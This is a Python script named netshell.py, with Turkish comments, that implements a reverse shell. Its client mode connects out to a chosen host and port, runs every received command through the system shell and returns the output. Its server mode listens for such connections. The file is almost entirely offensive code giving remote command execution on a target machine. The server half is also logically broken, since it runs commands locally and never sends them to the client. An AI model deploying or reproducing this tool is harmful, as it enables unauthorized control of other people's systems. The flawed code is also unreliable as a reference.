import socket
import subprocess
import sys

def print_help():
    """Yardım menüsünü yazdırır."""
    print("""
    Kullanım:
    python3 netshell.py server <port>   : Dinleyici başlatır (server) ve belirtilen portta dinler
    python3 netshell.py client <host> <port> : Reverse shell bağlantısı kurar (client) ve belirtilen IP ve port'a bağlanır

    Örnekler:
    python3 netshell.py server 1234   : Dinleyici 1234 portunda başlatılır
    python3 netshell.py client 10.0.2.15 1234   : Hedef makineye (10.0.2.15) 1234 portundan bağlanılır
    """)

def handle_client(client_socket):
    """Bağlantı sağlandıktan sonra shell başlatır."""
    print(f"Bağlantı sağlandı: {client_socket.getpeername()}")
    
    while True:
        command = input("Komut > ")
        
        # Komut boşsa tekrar döngüye gir
        if command.strip() == "":
            continue
        
        # Komut çalıştırılır ve sonucu istemciye gönderilir
        if command.lower() == "exit":
            client_socket.send("Bağlantı kapatılıyor...\n".encode('utf-8'))
            break
        
        try:
            # Komut çalıştırılır
            output = subprocess.run(command, shell=True, capture_output=True)
            response = output.stdout + output.stderr
            client_socket.send(response)
        except Exception as e:
            client_socket.send(f"Komut hatası: {e}".encode('utf-8'))

    client_socket.close()

def start_server(port):
    """Sunucu başlatır ve belirtilen portta bağlantıları dinler."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', port))  # Sunucu 0.0.0.0 üzerinde belirtilen portta dinler
    server_socket.listen(5)
    print(f"Dinleyici başlatıldı: {port} portunda...")
    
    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Bağlantı alındı: {client_address}")
        handle_client(client_socket)

def connect_reverse_shell(host, port):
    """Reverse shell bağlantısı kurar."""
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Bağlantıyı kur
        client_socket.connect((host, port))
        print(f"Bağlantı sağlandı {host}:{port}!")

        while True:
            command = client_socket.recv(1024).decode('utf-8')
            if command.lower() == "exit":
                client_socket.send("Bağlantı sonlandırılıyor...\n".encode('utf-8'))
                break
            if command.strip() != "":
                output = subprocess.run(command, shell=True, capture_output=True)
                client_socket.send(output.stdout + output.stderr)

    except Exception as e:
        print(f"Bağlantı hatası: {e}")

    finally:
        client_socket.close()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print_help()
    elif sys.argv[1].lower() == "server":
        try:
            port = int(sys.argv[2])  # Portu kullanıcıdan al
            start_server(port)
        except ValueError:
            print("Lütfen geçerli bir port numarası girin.")
            print_help()
    elif sys.argv[1].lower() == "client":
        try:
            host = sys.argv[2]  # Hedef IP'yi kullanıcıdan al
            port = int(sys.argv[3])  # Portu kullanıcıdan al
            connect_reverse_shell(host, port)
        except ValueError:
            print("Lütfen geçerli bir port numarası girin.")
            print_help()
        except IndexError:
            print("Lütfen hedef IP ve port bilgilerini girin.")
            print_help()
    else:
        print_help()
